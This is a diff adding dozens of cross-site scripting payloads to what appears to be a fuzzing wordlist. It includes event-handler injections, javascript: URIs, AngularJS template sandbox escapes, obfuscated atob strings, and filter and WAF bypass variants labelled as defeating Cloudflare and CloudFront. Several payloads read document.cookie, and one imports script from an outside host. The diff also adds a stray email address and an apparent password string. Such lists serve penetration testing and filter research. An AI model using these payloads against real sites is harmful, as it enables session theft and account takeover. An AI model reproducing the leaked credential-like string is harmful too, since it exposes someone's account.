@@ -1,3 +1,59 @@
+javascripta:alert(xss)//
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+onpointerenter%3Dconfirm%281%29
+<inpuT autofocus oNFocus="setTimeout(function() { /*\*/top['al'+'\u0065'+'rt'](1)/*\*/ }, 5000);"></inpuT%3E;
+jeligob139@darkse.com
+2Lc4q9P(Tw6w+6'X,q'cZ36wcAE6WD5M
+"><img/src/onerror=.1|alert``
+Set.constructoralert\x28document.domain\x29``
+\";alert('XSS');//
+[alert][0].call(this,1)
+wp-json/wp/v2/
+"><a href=javas&#99;ript:alert(1)
+<script>onerror=alert;throw'hacked';</script>
+''"><script>(1)</script><iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=shetty></iFramE>
+javascript:alert(document.cookie)
+javascript://%0aalert(1)
+"><script>alert(hello)</script>
+<scri00pt0>eval[(1)]</sc00rip00t>
+{{0[a='constructor'][a]('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+<svg><script%20?>confirm(1)
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+<svg%2Fonload%3Deval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ%3D%3D’))>
+<a href="javascript:alert(1)">Click Here</a>
+<svg+onload='<script'-alert(1)>
+<ScRiPt>alert(document.domain)</ScRiPt>
+<ScRiPt/random>alert(document.domain);</ScRiPt>
+<src<ScRiPt/random>ipt>alert(document.domain);<src</ScRiPt>ipt>
+<scr\x00ipt>alert(document.domain)<scr\x00ipt>
+"><img src=x onerror=alert(document.domain)>          
+"><!--><svg/onload=alert(document.domain)>  
+<iframe%00src="&Tab;javascript:prompt(document.domain)&Tab;%00>    
+<img src=1 onerror=print()>
+<script>alert(document.domain)</script>
+"onmousemove=alert("XSS_BY_shetty") "
+<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
+<svg/onload=window["al"+"ert"]1337>
+<Img Src=OnXSS OnError=confirm(1337)>
+<Svg Only=1 OnLoad=confirm(document.domain)>
+<svg onload=alert&#0000000040document.cookie)>
+<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><IMg%20SrC=x%20onerror=prompt(xss)>
+<Svg%20On%20Only=1%20Onload=alert(1)>"
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
+alert&#x000000028;origin&#x000029;>
 //%01javascript:alert(1)
 %09Jav%09ascript:alert(1)
 %09Jav%09ascript:alert(document.domain)
